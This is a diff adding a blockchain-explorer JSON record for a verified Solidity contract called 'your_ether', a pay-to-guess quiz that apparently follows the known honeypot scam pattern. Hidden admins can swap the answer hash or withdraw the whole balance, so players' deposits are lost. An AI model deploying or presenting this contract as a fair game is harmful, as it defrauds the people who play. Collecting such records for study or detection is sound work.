@@ -1,0 +1,25 @@
+{
+  "TxHash": "0x7311804bc0ebbaa81c0dfd1c89769b67ff70e4714dc8db27c8a91e6194c70e46",
+  "ContractAddress": "0x5a6E26b24eA68526f9ca50E1995Cf6e758A74006",
+  "Name": "your_ether",
+  "PackageStatus": 0,
+  "status": "1",
+  "message": "OK",
+  "result": [
+    {
+      "SourceCode": "pragma solidity ^0.8.0;\r\n\r\ncontract your_ether\r\n{\r\n    function Try(string memory _response) public payable\r\n    {\r\n        require(msg.sender == tx.origin);\r\n\r\n        if(responseHash == keccak256(abi.encode(_response)) \u0026\u0026 msg.value \u003e 1 ether)\r\n        {\r\n            payable(msg.sender).transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    string public question;\r\n\r\n    bytes32 responseHash;\r\n\r\n    mapping (bytes32=\u003ebool) admin;\r\n\r\n    function Start(string calldata _question, string calldata _response) public payable isAdmin{\r\n        if(responseHash==0x0){\r\n            responseHash = keccak256(abi.encode(_response));\r\n            question = _question;\r\n        }\r\n    }\r\n\r\n    function Stop() public payable isAdmin {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n        responseHash = 0x0;\r\n    }\r\n\r\n    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] memory admins) {\r\n        for(uint256 i=0; i\u003c admins.length; i++){\r\n            admin[admins[i]] = true;        \r\n        }       \r\n    }\r\n\r\n    modifier isAdmin(){\r\n        require(admin[keccak256(abi.encodePacked(msg.sender))]);\r\n        _;\r\n    }\r\n\r\n    fallback() external {}\r\n}",
+      "ABI": "[{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"admins\",\"type\":\"bytes32[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"bytes32\",\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"New\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]",
+      "ContractName": "your_ether",
+      "CompilerVersion": "v0.8.19+commit.7dd6d404",
+      "OptimizationUsed": "1",
+      "Runs": "200",
+      "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000003b3d7916177ffc0d690b25afc96a9274968a4e7e2afb8490bfdee175c2be4c7a409d894007b29744840a6713b76964b270a60328d71b4ae0a5b18a5711c280bd34a1a3fcbef6bfc0e8e1561fd379a661c49ca7d0adaae8b1068acb246cd6c68ab",
+      "EVMVersion": "Default",
+      "Library": "",
+      "LicenseType": "GNU GPLv3",
+      "Proxy": "0",
+      "Implementation": "",
+      "SwarmSource": "ipfs://52a16a30863bb548d3c81195b038a1ab2e0ffbdbb49dc3e6c9373745987a826a"
+    }
+  ]
+}
